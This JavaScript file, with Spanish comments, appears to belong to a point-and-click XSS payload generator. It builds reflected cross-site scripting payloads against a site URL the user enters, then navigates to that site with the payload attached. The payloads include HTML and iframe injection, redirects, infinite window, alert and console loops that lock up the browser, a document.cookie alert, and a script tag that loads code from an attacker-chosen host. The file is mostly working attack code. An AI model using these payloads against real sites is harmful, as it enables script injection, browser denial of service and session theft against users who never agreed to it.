//Funciones Globales [Core]
function preparar_consola() {                   //Prepara la consola para armar una sentencia.
    comandos.innerText = "";                    //Limpiar Comandos.
    mi_sitio = inputSitio.value;                //Variable Sitio.
    mi_mensaje = inputMensaje.value;            //Variable Mensaje.
    mi_redireccion = inputRedireccion.value;    //Variable Redireccion.
    if (mi_mensaje == "") {                     //Valores por defecto si los parámetros están vacíos.
        mi_mensaje = "https://github.com/dc5411"; 
    }
    if (mi_redireccion == "") {
        mi_redireccion = "https://github.com/dc5411";
    }
}

function imprimir_consola(texto) {              //Imprime texto a la consola.
    comandos.innerText = "" + texto;
}

function sitio_existe() {                       //Chequear si el valor obligatorio "Sitio" existe.
    if (inputSitio.value == "") {
        comandos.innerHTML += "<b>[!] Error Fatal:</b><BR>- Tiene que definir un sitio vulnerable, como <i>'www.misitiovulnerable.com/?q='</i>.<BR>";
        return false;
    } else {
        return true;
    }
}

function armar_payload(payload) {               //Armar Payload.
    inputPayload.value = "" + payload;
    mi_payload = payload;
}

function ejecutar() {                           //Ejecutar la sentencia XSS en el Sitio.
    window.location = inputSitio.value + inputPayload.value;
}

function probar() {                             //Ejecutar la sentencia XSS en una Plantilla de prueba.
    window.location = "media/html/template.html?usuario=" + inputPayload.value;
}

//Funciones para Payloads
function inyeccion_html() {                     //Inyección HTML.
    preparar_consola();
    if (sitio_existe() == true) {
        armar_payload("<b><u><i>" + mi_mensaje + "</i></u></b>");
        imprimir_consola(mi_sitio + mi_payload);
    }
}

function ventana_alert() {                      //Alertas Javascript.
    preparar_consola();
    if (sitio_existe() == true) {
        armar_payload("<script>alert('" + mi_mensaje + "');</script>");
        imprimir_consola(mi_sitio + mi_payload);
    }
}

function redireccion() {
    preparar_consola();
    if (sitio_existe() == true) {
        armar_payload("<script>window.location.assign('" + mi_redireccion + "');</script>");
        imprimir_consola(mi_sitio + mi_payload);
    }
}

function flood_ventanas() {
    preparar_consola();
    if (sitio_existe() == true) {
        armar_payload("<script>while(1){window.open('" + mi_redireccion + "');}</script>");
        imprimir_consola(mi_sitio + mi_payload);
    }
}

function flood_memoria() {
    preparar_consola();
    if (sitio_existe() == true) {
        armar_payload("<script>while(1){console.log('a');}</script>");
        imprimir_consola(mi_sitio + mi_payload);
    }
}

function flood_alert(){
    preparar_consola();
    if (sitio_existe() == true) {
        armar_payload("<script>while(1){alert('"+mi_mensaje+"');}</script>");
        imprimir_consola(mi_sitio + mi_payload);
    }
}

function xss_cookie(){
    preparar_consola();
    if (sitio_existe() == true) {
        armar_payload("<script>alert(document.cookie);</script>");
        imprimir_consola(mi_sitio + mi_payload);
    }
}

function xss_RFI(){
    preparar_consola();
    if (sitio_existe() == true) {
        armar_payload("<script src='"+mi_redireccion+"'></script>");
        imprimir_consola(mi_sitio + mi_payload);
    }
}

function iframe(){
    preparar_consola();
    if (sitio_existe() == true) {
        armar_payload("<iframe src='"+mi_redireccion+"'></iframe>");
        imprimir_consola(mi_sitio + mi_payload);
    }
}

function inyectar_imagen(){
    preparar_consola();
    if (sitio_existe() == true) {
        armar_payload("<img src='"+mi_redireccion+"'>");
        imprimir_consola(mi_sitio + mi_payload);
    }
}

function inyectar_video(){
    preparar_consola();
    if (sitio_existe() == true) {
        armar_payload("<video controls><source src='"+mi_redireccion+"'></video>");
        imprimir_consola(mi_sitio + mi_payload);
    }
}